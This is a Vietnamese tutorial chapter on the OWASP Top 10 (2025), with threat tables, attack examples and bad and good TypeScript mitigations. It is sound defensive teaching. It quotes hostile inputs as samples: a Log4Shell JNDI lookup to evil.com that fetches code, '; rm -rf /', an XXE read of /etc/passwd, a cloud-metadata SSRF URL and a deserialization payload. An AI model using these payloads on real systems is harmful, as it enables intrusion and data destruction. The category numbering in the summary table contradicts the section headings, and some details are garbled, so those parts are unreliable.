# 🛡️ 9.1 OWASP Top 10

> **OWASP Top 10** là danh sách 10 lỗ hổng bảo mật web nghiêm trọng nhất, được OWASP (Open Web Application Security Project) công bố định kỳ (~4 năm/lần). **Bản 2025 đã phát hành chính thức** (11/2025, công bố tại OWASP Global AppSec).
>
> OWASP = tổ chức phi lợi nhuận giáo dục về app security. Top 10 không phải technical standard — nó là **risk awareness tool** giúp developer và stakeholder hiểu mối đe dọa phổ biến nhất.

```
┌─────────────────────────────────────────────────────────┐
│              OWASP TOP 10 — 2025                         │
├──────┬───────────────────────────┬───────────────────────┤
│  #   │  Lỗ hổng                  │  Tác động chính       │
├──────┼───────────────────────────┼───────────────────────┤
│ A01  │ Broken Access Control     │ Truy cập trái phép    │
│      │ (+ SSRF gộp từ A10/2021)  │ + SSRF                │
│ A02  │ Security Misconfiguration │ Cấu hình sai (#5→#2)  │
│ A03  │ Software Supply Chain     │ Thư viện cũ/lỗ hổng   │
│      │ Failures (MỚI)            │ + CI/CD, build system │
│ A04  │ Cryptographic Failures    │ Rò rỉ dữ liệu (#2→#4) │
│ A05  │ Injection                 │ Thực thi mã độc       │
│ A06  │ Insecure Design           │ Kiến trúc yếu         │
│ A07  │ Authentication Failures   │ Đánh cắp tài khoản    │
│ A08  │ Software/Data Integrity   │ Xâm phạm toàn vẹn     │
│ A09  │ Security Logging &        │ Không phát hiện       │
│      │ Alerting Failures         │ tấn công              │
│ A10  │ Mishandling of            │ Fail open khi lỗi     │
│      │ Exceptional Conditions    │ (MỚI hoàn toàn)       │
└──────┴───────────────────────────┴───────────────────────┘
```

### 🔄 Thay đổi vs 2021

| Thay đổi | Chi tiết |
|----------|----------|
| **SSRF gộp vào A01** | SSRF (A10/2021) không còn là hạng mục riêng — được xem là một dạng Broken Access Control |
| **A03 mới: Software Supply Chain Failures** | Mở rộng từ "Vulnerable and Outdated Components" (A06/2021) sang toàn bộ supply chain: dependencies, CI/CD, build systems, distribution |
| **A10 mới: Mishandling of Exceptional Conditions** | Hoàn toàn mới — xử lý lỗi/điều kiện bất thường an toàn, không bao giờ "fail open" |
| **A02 Security Misconfiguration** | Tăng #5 → #2 |
| **A04 Cryptographic Failures** | Giảm #2 → #4 |
| **A05 Injection** | Giảm #3 → #5 |
| **A06 Insecure Design** | Giảm #4 → #6 |
| **A07 đổi tên** | "Identification and Authentication Failures" → "Authentication Failures" |
| **A09 đổi tên** | "Monitoring" → "Alerting" |

> Dựa trên dữ liệu 2.8+ triệu ứng dụng, 589 CWE được phân tích. Chi tiết: [top10.owasp.org/2025](https://top10.owasp.org/2025/en)

---

## A01 — Broken Access Control (Kiểm soát truy cập yếu)

**Mô tả:** Người dùng có thể truy cập tài nguyên thuộc về người khác hoặc thực hiện hành vi không được ủy quyền. Đây là lỗ hổng **#1 theo số lần xuất hiện** trong thực tế.

### Threat Model

| Threat | Attack example | Impact |
|--------|---------------|--------|
| **IDOR** (Insecure Direct Object Reference) | `GET /api/orders/123` — User A xem đơn hàng User B | Data breach, PII leak |
| **Privilege Escalation** | `PUT /api/users/role` → tự elevation thành admin | Full system compromise |
| **Missing Function-Level Access Control** | truy cập `/api/admin/delete-user` mà không có admin role | Admin functions accessible |
| **CORS Misconfiguration** | `Access-Control-Allow-Origin: *` với credentials | Cross-site data theft |
| **SSRF** (gộp từ A10/2021) | `/api/fetch?url=http://169.254.169.254/…` — server đọc cloud metadata | IAM credentials leak, internal service access |

### Attack example: IDOR

```
User A đăng nhập → lấy cookie → gọi:
GET /api/orders/456
→ Server trả về đơn hàng của User B (vì không check ownership)
```

### Defense / Mitigation

```typescript
// ❌ BAD — Không kiểm tra quyền (IDOR vulnerability)
app.get('/api/orders/:id', async (req, res) => {
  const order = await Order.findById(req.params.id);
  res.json(order); // User nào cũng xem được!
});

// ✅ GOOD — Kiểm tra ownership + authorization
app.get('/api/orders/:id', async (req, res) => {
  const order = await Order.findById(req.params.id);
  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }
  if (order.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  res.json(order);
});

// ✅ GOOD — Dùng middleware authorization pattern
function requireOwnerOrAdmin(resourceGetter) {
  return async (req, res, next) => {
    const resource = await resourceGetter(req.params.id);
    if (!resource) return res.status(404).json({ error: 'Not found' });
    if (resource.userId !== req.user.id && req.user.role !== 'admin') {
      return res.status(403).json({ error: 'Forbidden' });
    }
    req.resource = resource;
    next();
  };
}
```

### Phòng chống checklist
- ✅ Kiểm tra authorization trên **MỌI** request (không trust client-side check)
- ✅ Sử dụng RBAC/ABAC centrally (middleware, không lặp lại trong từng handler)
- ✅ Không dùng sequential ID (dùng UUID để tránh enumeration)
- ✅ Test IDOR bằng cách thay đổi ID trong URL

---

## A02 — Cryptographic Failures (Thất bại mã hóa)

**Mô tả:** Dữ liệu nhạy cảm (password, token, PII, payment info) không được mã hóa đúng cách — lưu plaintext, dùng thuật toán yếu, hoặc truyền không SSL.

### Threat Model

| Threat | Attack example | Impact |
|--------|---------------|--------|
| **Plaintext password storage** | DB leak → tất cả password đọc được | Credential stuffing attack |
| **Weak hash algorithm** | MD5/SHA1 hash → rainbow table reverse | Password crack trong giây |
| **No TLS** | HTTP traffic → người đứng giữa (man-in-the-middle) đọc | Session hijacking, data interception |
| **Weak encryption key** | Key hardcode trong source → leak | Data at rest readable |

### Attack example: Plaintext password

```sql
-- ❌ Stored in plaintext (DB dump = game over)
INSERT INTO users (email, password) VALUES ('a@b.com', '123456');

-- Result: attacker có toàn bộ passwords sau DB leak
```

### Defense / Mitigation

```typescript
import bcrypt from 'bcrypt';

const SALT_ROUNDS = 12;  // Cost factor — tăng khi hardware mạnh hơn

// ❌ BAD — plaintext storage
async function registerBad(email: string, password: string) {
  await db.users.create({ email, password });  // plaintext!
}

// ✅ GOOD — bcrypt hash với salt
async function registerGood(email: string, password: string) {
  const hashedPassword = await bcrypt.hash(password, SALT_ROUNDS);
  await db.users.create({ email, password: hashedPassword });
}

// ✅ Verify login
async function loginGood(email: string, password: string) {
  const user = await db.users.findByEmail(email);
  if (!user) return null;
  const isValid = await bcrypt.compare(password, user.password);
  return isValid ? user : null;
}
```

### Phòng chống checklist
- ✅ Password: bcrypt (cost ≥ 12) hoặc argon2id
- ✅ Data in transit: TLS 1.2+ bắt buộc
- ✅ Data at rest: AES-256-GCM cho sensitive fields
- ✅ Key management: AWS KMS / HashiCorp Vault, không hardcode
- ✅ Không tự implement crypto algorithm

---

## A03 — Injection (Tiêm nhiễm)

**Mô tả:** Dữ liệu không tin cậy (user input) được gửi vào interpreter (SQL, OS command, LDAP, XXE, template engine) mà không được escape/validate.

### Threat Model

| Injection type | Interpreter | Impact | Example |
|---------------|-------------|--------|---------|
| **SQL Injection** | SQL database | Data breach, data deletion | `1' OR '1'='1` |
| **Command Injection** | OS shell | Remote code execution | `; rm -rf /` |
| **XXE** | XML parser | File read, SSRF | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` |
| **LDAP Injection** | LDAP server | Auth bypass | `*)(uid=*)(` |
| **Template Injection** | Template engine | RCE | `{{constructor.constructor('return process')()}}` |
| **NoSQL Injection** | MongoDB etc. | Auth bypass | `{$ne: null}` |

### Attack example: SQL Injection

```typescript
import postgres from 'postgres';
const sql = postgres(process.env.DATABASE_URL);

// ❌ BAD — string concatenation (template literal trong postgres library escape tự động)
// NHƯNG nếu dùng raw query string:
const getUserBad = async (id: string) => {
  // DÙNG POOL.query với string concat = SQL injection!
  return sql.query(`SELECT * FROM users WHERE id = '${id}'`);
  // userInput = "1' OR '1'='1" → SELECT * FROM users WHERE id = '1' OR '1'='1'
};

// ✅ GOOD — parameterized query (library escape tự động)
const getUserGood = async (id: string) => {
  return sql`SELECT * FROM users WHERE id = ${id}`;
  // userInput = "1' OR '1'='1" → escaped thành string literal
};
```

### Defense / Mitigation

```typescript
// 1. Parameterized queries (tất cả SQL)
const users = await db.query('SELECT * FROM users WHERE email = $1', [email]);

// 2. ORM built-in protection
const user = await User.findOne({ where: { email } });

// 3. Input validation (whitelist)
const validId = z.string().uuid().parse(inputId);  // reject non-UUID

// 4. Least privilege DB account
// DB account chỉ có SELECT/INSERT/UPDATE trên table cần thiết, không DROP/ALTER
```

### Phòng chống checklist
- ✅ Dùng parameterized queries cho TẤT CẢ database operations
- ✅ Input validation (whitelist, type checking, schema validation)
- ✅ ORM thay vì raw SQL khi có thể
- ✅ DB account với least privilege (không superuser)
- ✅ Escaping output theo context (HTML, JS, URL, command)

---

## A04 — Insecure Design (Thiết kế không an toàn)

**Mô tả:** Thiếu threat modeling, không xét security từ giai đoạn thiết kế. Lỗi nằm ở **kiến trúc**, không phải implementation — code đúng nhưng design sai.

### Dấu hiệu nhận biết

```
⚠️ Không có rate limiting trên login endpoint
   → Attacker brute force không giới hạn

⚠️ Không có account lockout sau N lần fail
   → Brute force không bị chặn

⚠️ Password reset token dễ đoán (sequential số)
   → Attacker đoán token của user khác

⚠️ Không có audit log cho hành vi nhạy cảm
   → Không phát hiện được insider threat

⚠️ Flow xác thực dựa vào client-side check
   → Bypass dễ dàng bằng devtools

⚠️ Không có timeout cho sensitive operations
   → Session kéo dài vô tận
```

### Defense / Mitigation

```
✅ Áp dụng Threat Modeling (STRIDE methodology)
   ── S: Spoofing (giả mạo identity)
   ── T: Tampering (gian lận dữ liệu)
   ── R: Repudiation (redeem hành vi)
   ── I: Information disclosure (rò rỉ thông tin)
   ── D: Denial of service (phủ định dịch vụ)
   ── E: Elevation of privilege (nâng quyền)

✅ Security requirements trong PRD (Product Requirements Doc)
   ── Trước khi code: "Hệ thống cần những gì để an toàn?"

✅ Principle of least privilege
   ── Mỗi component chỉ có quyền tối thiểu cần thiết

✅ Default deny
   ── Mặc định block, chỉ open khi có lý do
```

---

## A05 — Security Misconfiguration (Cấu hình sai)

**Mô tả:** Cấu hình mặc định hoặc cấu hình sai khiến hệ thống dễ bị tấn công. Đây là lỗi **dễ sửa nhất** nhưng **xảy ra nhiều nhất**.

### Các cấu hình sai phổ biến

```
❌ Debug mode bật trên production
   → Stack trace expose internal paths, DB schema

❌ Default credentials (admin/admin, root/toor)
   → Attacker login được ngay

❌ CORS: Access-Control-Allow-Origin: *
   → Mọi trang web có thể gọi API của bạn

❌ HTTP thay vì HTTPS
   → Traffic đọc được bởi người đứng giữa (man-in-the-middle)

❌ Directory listing enabled
   → Attacker thấy toàn bộ file trong folder

❌ Server version expose
   → Headers: Server: nginx/1.18.0 (biết exact version = biết CVE)

❌ Unused endpoints active
   → Legacy API endpoints không được deactivate

❌ Error messages chi tiết
   → "Database connection failed: password wrong for user admin"
```

### Defense / Mitigation

```typescript
import helmet from 'helmet';

app.use(
  helmet({
    // Hides server version
    // Sets X-Content-Type-Options: nosniff
    // Sets X-Frame-Options: SAMEORIGIN
    // Sets Strict-Transport-Security
    // ...and more
  })
);

// ✅ Disable debug mode trong production
if (process.env.NODE_ENV === 'production') {
  app.set('trust proxy', 1);
  // no error stack trace in responses
}

// ✅ CORS strict
app.use(cors({
  origin: ['https://yourdomain.com'],  // KHÔNG phải '*'
  credentials: true
}));
```

### Phòng chống checklist
- ✅ Tắt debug/error detail trên production
- ✅ Đổi default credentials
- ✅ HTTPS enforced (HSTS)
- ✅ CORS restrict origin
- ✅ Ẩn server version headers
- ✅ Delete unused endpoints
- ✅ Security headers (helmet.js)
- ✅ Regular config audit (checklist every deploy)

---

## A06 — Software Supply Chain Failures (Thất bại chuỗi cung ứng phần mềm) — *mới trong 2025, mở rộng từ "Vulnerable and Outdated Components"*

**Mô tả:** Lỗi xuyên suốt chuỗi cung ứng phần mềm: dependency có lỗ hổng đã biết (CVE), CI/CD bị xâm phạm, build system không an toàn, kênh distribution bị giả mạo. Attacker scan dependency list, tìm CVE, exploit — hoặc tấn công thẳng vào pipeline.

### Attack example: Log4Shell (2021)

```
CVE-2021-44228 trong Log4j 2.x
→ Attacker gửi payload qua HTTP header: ${jndi:ldap://evil.com/a}
→ Log4j parse JNDI lookup → download & execute malware từ evil.com
→ Remote Code Execution (RCE) trên server

Impact: Phạm vi toàn industry — AWS, Apple, Minecraft, cloud providers
Cost: Hàng tỷ USD patch global
```

### Defense / Mitigation

```bash
# 1. Pin versions — không dùng ^ hoặc *
# package.json
{
  "dependencies": {
    "express": "4.18.2",      # ✅ pin exact
    "lodash": "4.17.21"       # ✅ pin exact
    # "express": "^4.17.1"    # ❌ có thể update lên bản có CVE
    # "*": "*"                 # ❌ tuyệt đối không
  }
}

# 2. Scan dependencies regularly
npm audit                   # npm built-in
npm audit --production      # chỉ scan production deps
npx snyk test               # Snyk CLI
gitleaks detect .           # scan cho secrets trong code

# 3. Automated scanning trong CI
# .github/workflows/security.yml
- run: npm audit --audit-level=high
- run: npx @ snyk/cli test --severity-threshold=high
```

### Phòng chống checklist
- ✅ Pin versions (exact version, không `^` hay `~`)
- ✅ Chạy `npm audit` / `yarn audit` / `pip-audit` định kỳ
- ✅ Dùng Dependabot / Snyk / Renovate tự động cảnh báo
- ✅ Subscribe CVE feeds cho critical dependencies
- ✅ Update emergency khi có CVE nghiêm trọng (RCE, auth bypass)
- ✅ Minimal dependencies — fewer dependencies = fewer attack surfaces

---

## A07 — Authentication Failures (Yếu xác thực)

**Mô tả:** Xác thực và quản lý session yếu — brute force, session fixation, weak password policy, credential stuffing.

### Attack examples

```
❌ Brute force login
   → Thử hàng triệu password phổ biến (haveibeenpwned database)
   → Không có rate limit = thành công

❌ Session fixation
   → Attacker set session ID trước khi user login
   → Sau khi login, session ID vẫn giữ → attacker dùng được

❌ Password trong localStorage (bị XSS đọc)
   → XSS attack đọc localStorage → steal credentials

❌ Weak password policy
   → "123456", "password" vẫn được chấp nhận
   → Credential stuffing dễ dàng
```

### Defense / Mitigation

```typescript
import bcrypt from 'bcrypt';
import rateLimit from 'express-rate-limit';

// 1. Rate limit login endpoint
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 phút
  max: 5,                     // tối đa 5 attempts
  message: { error: 'Too many login attempts, please try again later' },
  standardHeaders: true,      // return rate limit info in headers
  legacyHeaders: false,
});

app.post('/api/login', loginLimiter, async (req, res) => {
  const { email, password } = req.body;
  // verify password with bcrypt...
});

// 2. Strong password policy
const passwordSchema = z.string()
  .min(12)                          // tối thiểu 12 ký tự
  .regex(/[A-Z]/, 'must have uppercase')
  .regex(/[a-z]/, 'must have lowercase')
  .regex(/[0-9]/, 'must have number')
  .regex(/[^A-Za-z0-9]/, 'must have special char');

// 3. Secure session cookie
res.cookie('sessionId', token, {
  httpOnly: true,     // JS không đọc được (chống XSS)
  secure: true,       // chỉ gửi qua HTTPS
  sameSite: 'strict', // không gửi cross-site (chống CSRF)
  maxAge: 15 * 60 * 1000,  // 15 phút
});

// 4. MFA optional but recommended
// TOTP via Google Authenticator / Authy
```

### Phòng chống checklist
- ✅ Password hash với bcrypt (cost ≥ 12) hoặc argon2id
- ✅ Rate limit login endpoint (5 attempts / 15 minutes)
- ✅ Account lockout sau N lần fail (lock 15 phút)
- ✅ Enable MFA (TOTP preferred, SMS acceptable fallback)
- ✅ Strong password policy (12+ chars, complexity)
- ✅ Secure cookies (HttpOnly, Secure, SameSite=Strict)
- ✅ Không lưu session trong localStorage
- ✅ Detect and block credential stuffing (HaveIBeenPwned check)

---

## A08 — Software & Data Integrity Failures

**Mô tả:** Không kiểm tra tính toàn vẹn của dữ liệu hoặc code — insecure deserialization, unsigned updates, CI/CD pipeline tampering.

### Attack example: Insecure Deserialization

```typescript
// ❌ BAD — deserialize untrusted data
import { deserialize } from 'serialize-javascript';

app.post('/api/preference', (req, res) => {
  // Attacker gửi payload: "Function('return process')().mainModule.require('child_process').exec('rm -rf /')"
  const prefs = deserialize(req.body.preferences);  // RCE!
});

// ✅ GOOD — validate schema before deserialize
import { z } from 'zod';

const PreferenceSchema = z.object({
  theme: z.enum(['light', 'dark']),
  language: z.enum(['vi', 'en', 'ja']),
  notifications: z.boolean(),
});

app.post('/api/preference', (req, res) => {
  const parsed = PreferenceSchema.parse(req.body.preferences);  // throws if invalid
  // safe to use parsed
});
```

### Defense / Mitigation
- ✅ Validate schema trước khi deserialize (Zod, Joi, Yup)
- ✅ Signed/encrypted updates (không trust unsigned binary)
- ✅ Pin CI/CD actions (actions/checkout@v4, không actions/checkout)
- ✅ Code signing cho artifacts

---

## A09 — Security Logging & Alerting Failures — *đổi tên từ "Monitoring" trong 2025*

**Mô tả:** Log không đủ, không giám sát, không cảnh báo — attacker hoạt động trong system mà không bị phát hiện.

### Cần log những gì

```
✅ Login success (user, IP, user-agent, timestamp)
✅ Login fail (user, IP, user-agent, reason)
✅ Permission denied events (ai muốn làm gì, bị chặn ở đâu)
✅ Admin actions (create/delete/modify user, change settings)
✅ Password reset requests (success/fail)
✅ API key usage anomalies (unusual location, high frequency)
✅ Configuration changes (security group thay đổi, IAM policy changes)

❌ KHÔNG bao giờ log:
   - Password (plaintext hoặc hash)
   - Full credit card number (mask: ****1234)
   - Full PII (national ID, passport number)
   - Authorization token / session cookie
```

### Phòng chống checklist
- ✅ Log mọi auth event (success + fail)
- ✅ Log mọi privilege change
- ✅ Centralized log aggregation (ELK, Loki, Datadog)
- ✅ Real-time alerting cho suspicious patterns
- ✅ Log retention policy (minimum 90 days)
- ✅ KHÔNG log sensitive data (password, token, full CC number)

---

## SSRF — Server-Side Request Forgery — *nay thuộc A01 Broken Access Control trong 2025*

> ℹ️ Trong OWASP Top 10 2025, **SSRF không còn là hạng mục riêng** (trước đây là A10/2021) — nó được xem là một dạng Broken Access Control.

**Mô tả:** Server gửi HTTP request đến URL do attacker kiểm soát — attacker lợi dụng server như proxy để nội scan, access metadata service, hoặc reach internal services.

### Attack example: Cloud Metadata Access

```typescript
// ❌ BAD — attacker control URL
app.get('/api/fetch-image', async (req, res) => {
  const url = req.query.url;
  // Attacker gọi: /api/fetch-image?url=http://169.254.169.254/latest/meta-data/
  // → Server đọc AWS instance credentials từ metadata service
  // → Attacker có IAM credentials → full AWS account compromise
  const response = await fetch(url);
  const buffer = await response.buffer();
  res.send(buffer);
});

// ✅ GOOD — whitelist allowed hosts
const ALLOWED_HOSTS = ['api.example.com', 'images.example.com'];

app.get('/api/fetch-image', async (req, res) => {
  const url = new URL(req.query.url);
  if (!ALLOWED_HOSTS.includes(url.hostname)) {
    return res.status(403).json({ error: 'Host not allowed' });
  }
  // ...fetch and return
});
```

### Defense / Mitigation
- ✅ Whitelist allowed hosts/domains
- ✅ Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.169.254)
- ✅ Reject URL redirects (follow_redirects: false)
- ✅ Timeout request (chống slowloris SSRF)
- ✅ Network segmentation (internal services không reachable từ web tier)

---

## A10 — Mishandling of Exceptional Conditions (Xử lý sai điều kiện bất thường) — *hoàn toàn mới trong 2025*

**Mô tả:** Hệ thống xử lý sai các điều kiện bất thường (error, timeout, resource cạn, trạng thái lạ) — điển hình là **"fail open"**: khi có lỗi thì mở quyền truy cập thay vì khóa lại. Hệ thống rơi vào trạng thái không an toàn khi gặp tình huống bất ngờ.

### Attack example: Fail Open khi service lỗi

```typescript
// ❌ BAD — fail open: khi auth service lỗi, cho phép mọi request
app.use(async (req, res, next) => {
  try {
    await verifyToken(req.headers.authorization);
    next();
  } catch (err) {
    next();  // "Service down → cứ cho qua" = DISASTER
  }
});

// ✅ GOOD — fail closed: lỗi → từ chối (fail secure)
app.use(async (req, res, next) => {
  try {
    await verifyToken(req.headers.authorization);
    next();
  } catch (err) {
    // Lỗi hệ thống → từ chối request (503), KHÔNG mở khóa
    return res.status(503).json({ error: 'Service unavailable' });
  }
});
```

### Defense / Mitigation
- ✅ Fail closed (default deny) — lỗi phải dẫn đến từ chối, không phải cho phép
- ✅ Retry với exponential backoff + circuit breaker (chặn retry storm)
- ✅ Timeout mọi call ra ngoài (không treo vô hạn)
- ✅ Idempotency cho retry (tránh xử lý trùng lặp)
- ✅ Test các đường lỗi (fault injection, chaos engineering)

### CWE liên quan

A10:2025 bao gồm **24 CWEs**, nổi bật:

| CWE | Tên | Ý nghĩa |
|-----|-----|---------|
| **CWE-755** | Improper Handling of Exceptional Conditions | Không prevent/detect/respond với tình huống bất thường |
| **CWE-228** | Improper Handling of Incomplete/Inconsistent Resource Cleanup | Resource dở dang khi điều kiện lỗi (connection leak, file lock) |
| **CWE-252** | Unchecked Return Value | Bỏ qua return value/error của call → fail open ngầm |

Các CWE này trước đây từng bị xếp vào "poor code quality" — OWASP 2025 chính thức xếp vào **rủi ro bảo mật** vì stack trace lộ chi tiết, fail open, và logic error đều chuyển thành lỗ hổng (xem ví dụ "fail open" phía trên và [14.3 Error Handling](../../14-clean-code/14.3-error-handling/README.md)).

Ref: https://owasp.org/Top10/2025/ — [A10:2025 đầy đủ](https://owasp.org/Top10/2025/A10_2025-Mishandling_of_Exceptional_Conditions/)

---

## 📊 Tổng hợp phòng chống

| Lớp | Biện pháp | Công cụ |
|-----|-----------|---------|
| 🔐 **Design** | Threat modeling (STRIDE), security requirements in PRD | OWASP ASVS, STRIDE |
| 🛡️ **Code** | Input validation, parameterized queries, output encoding | Zod, ORM, DOMPurify |
| 🔒 **Config** | Security headers, CORS strict, disable debug | Helmet, CORS middleware |
| 📦 **Dependencies** | `npm audit`, dependabot, pin versions | Snyk, Dependabot, Renovate |
| 📝 **Alerting** | Audit log, SIEM, alert on anomalies | ELK, Datadog, CloudWatch |
| 🧪 **Testing** | SAST/DAST, pen test, OWASP ZAP scan | SonarQube, Burp Suite, ZAP |

---

## 📚 Tài liệu tham khảo

- 📖 [OWASP Top 10 2025](https://top10.owasp.org/2025/en)
- 📖 [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- 📖 [CWE Top 25](https://cwe.mitre.org/top25/)
- 📖 [OWASP ASVS (Application Security Verification Standard)](https://owasp.org/www-project-application-security-verification-standard/)

---

## ▶️ Chạy ví dụ

```bash
cd 09-security/9.1-owasp-top10
npx tsx examples/index.ts
```

---

⏭️ Bài tiếp theo → [9.2 JWT Authentication](../9.2-jwt-authentication/README.md)
